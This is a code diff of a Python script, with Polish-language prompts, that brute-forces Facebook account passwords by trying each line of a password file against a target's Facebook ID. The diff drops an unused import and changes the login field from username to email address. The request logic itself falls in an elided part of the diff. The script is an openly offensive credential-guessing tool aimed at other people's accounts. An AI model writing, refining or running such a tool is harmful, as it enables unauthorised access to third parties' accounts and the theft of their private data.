@@ -1,6 +1,4 @@
-
 import requests
-from bs4 import BeautifulSoup
 
 def brute_force(username, fb_id, passwords):
     url = f'https://www.facebook.com/{fb_id}'
@@ -18,14 +16,14 @@ def brute_force(username, fb_id, passwords):
                 print(f'Nieprawidłowe hasło: {password}')
 
 def main():
-    username = input('Podaj nazwę użytkownika: ')
+    email = input('Podaj adres e-mail (jako nazwę użytkownika): ')
     fb_id = input('Podaj identyfikator Facebooka: ')
     password_file = input('Podaj nazwę pliku z hasłami: ')
 
     with open(password_file, 'r') as file:
         passwords = [line.strip() for line in file]
 
-    brute_force(username, fb_id, passwords)
+    brute_force(email, fb_id, passwords)
 
 if __name__ == '__main__':
     main()
